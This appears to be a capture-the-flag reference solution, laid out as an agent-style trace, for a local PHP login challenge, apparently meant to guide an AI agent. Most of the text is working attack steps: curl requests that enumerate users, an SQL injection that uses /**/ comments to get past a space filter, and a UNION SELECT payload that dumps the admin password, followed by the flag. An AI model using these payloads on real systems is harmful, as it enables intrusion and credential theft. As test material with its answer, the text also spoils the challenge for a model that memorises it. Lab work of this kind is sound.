### How I would solve?


Can you login in our beta program? We have forgot the password ! 
http://localhost:8080/

<thought>
Ok, there is some website, let me see what it is
</thought>

<command>
➜  ~ curl http://localhost:8080
<command>

<output>
    <html>
    <head><title>PHPAbUsers</title></head>
    <body>
        <p><h3>Available functions</h3></p>
        <a href="/search.php">Search users</a><br>
        <a href="/login.php">Login</a><br>
    </body>
    </html>%
<output>

<thought>
ok there is login and search pages, let me check each
</thought>

➜  ~ curl http://localhost:8080/login.php

<!-- The login form -->
<form action="login.php" method="POST">
    <div class="form-group">
        <label for="user">Username:</label>
        <input type="text" class="form-control" id="username" name="username" required>
    </div>
    <div class="form-group">
        <label for="pwd">Password:</label>
        <input type="password" class="form-control" id="password" name="password" required>
    </div>
    <button type="submit" class="btn btn-default">Login</button>
</form>

<a href="/index.php">Back to index</a><br>



<thought>
we need password and username login, but we dont know username and passowrd, there is user search func, lets see what users eixists
</thought>

➜  ~ curl http://localhost:8080/search.php
You are connected successfully!<br/> No results
<!-- The search form -->
<form action="search.php" method="POST">
<div class="form-group">
  <label for="user">Username:</label>
  <input type="text" class="form-control" id="username" name="username">
</div>
<button type="submit" class="btn btn-default">Validate</button>
</form>
<a href="/index.php">Back to index</a><br>%


<thought>
seems like post requst, let me perform post and see if admin exist
</thought>

➜  ~ curl http://localhost:8080/search.php
➜  ~ curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:8080' \
    --data-binary $'username=admin' \
    $'http://localhost:8080/search.php'
HTTP/1.1 200 OK
Date: Tue, 04 Feb 2025 02:52:03 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 385
Content-Type: text/html; charset=UTF-8

You are connected successfully!<br/> User exists: admin<br/>
<!-- The search form -->
<form action="search.php" method="POST">
<div class="form-group">
  <label for="user">Username:</label>
  <input type="text" class="form-control" id="username" name="username">
</div>
<button type="submit" class="btn btn-default">Validate</button>
</form>
<a href="/index.php">Back to index</a><br>%


<thought>
yes, there is admin, maybe search has sqli as this is php, let me try basic sqli test
</thought>

➜  ~ curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:8080' \
    --data-binary $'username=" or 1=1#' \
    $'http://localhost:8080/search.php'
HTTP/1.1 200 OK
Date: Tue, 04 Feb 2025 02:52:53 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 77
Content-Type: text/html; charset=UTF-8

You are connected successfully!<br/> <strong>some item is filtered! </strong>%

<thought>
oh seems there is some kind of filtaration, what it is
</thought>

<thought>
i read source code, so ik the spaces are filtered but our avi should figure out somehow
</thought>


<thought>
let me try removing spaces
</thought>
➜  ~ curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:8080' \
    --data-binary $'username="/**/or/**/1=1#' \
    $'http://localhost:8080/search.php'
HTTP/1.1 200 OK
Date: Tue, 04 Feb 2025 02:53:11 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 385
Content-Type: text/html; charset=UTF-8

You are connected successfully!<br/> User exists: admin<br/>
<!-- The search form -->
<form action="search.php" method="POST">
<div class="form-group">
  <label for="user">Username:</label>
  <input type="text" class="form-control" id="username" name="username">
</div>
<button type="submit" class="btn btn-default">Validate</button>
</form>
<a href="/index.php">Back to index</a><br>%



<thought>
seems worked, lets exploit, and read password,
</thought>


<thought>
many attempts to be done to figure out how db structure, how many rows are there and so on, i checked source code so it is easy for me but avi doesn't have</thought>

<thought>
let me try this payload
</thought>

➜  ~ curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:8080' \
    --data-binary $'username="/**/or/**/1=1#' \
    $'http://localhost:8080/search.php'
HTTP/1.1 200 OK
Date: Tue, 04 Feb 2025 02:53:16 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 385
Content-Type: text/html; charset=UTF-8

You are connected successfully!<br/> User exists: admin<br/>
<!-- The search form -->
<form action="search.php" method="POST">
<div class="form-group">
  <label for="user">Username:</label>
  <input type="text" class="form-control" id="username" name="username">
</div>
<button type="submit" class="btn btn-default">Validate</button>
</form>
<a href="/index.php">Back to index</a><br>%
➜  ~ curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:8080' \
    --data-binary $'username=admin"UNION/**/SELECT/**/1,password,1/**/FROM/**/users/**/ORDER/**/BY/**/2##' \
    $'http://localhost:8080/search.php'
HTTP/1.1 200 OK
Date: Tue, 04 Feb 2025 02:53:53 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 421
Content-Type: text/html; charset=UTF-8

You are connected successfully!<br/> User exists: admin<br/>User exists: ThisIsBestPassword<br/>
<!-- The search form -->
<form action="search.php" method="POST">
<div class="form-group">
  <label for="user">Username:</label>
  <input type="text" class="form-control" id="username" name="username">
</div>
<button type="submit" class="btn btn-default">Validate</button>
</form>
<a href="/index.php">Back to index</a><br>%


<thought>
nice we got the password, lets login

<thought>

curl 'http://localhost:8080/login.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=admin&password=ThisIsBestPassword'

  Congratz, flag is FLAG{c1aa7b7022dd4a9c8e78927cfd19d88d18a26cd73d4cca0d153f6a2e8d5170b5}%

  <thought>
  we got the flag, exiting
  </thought>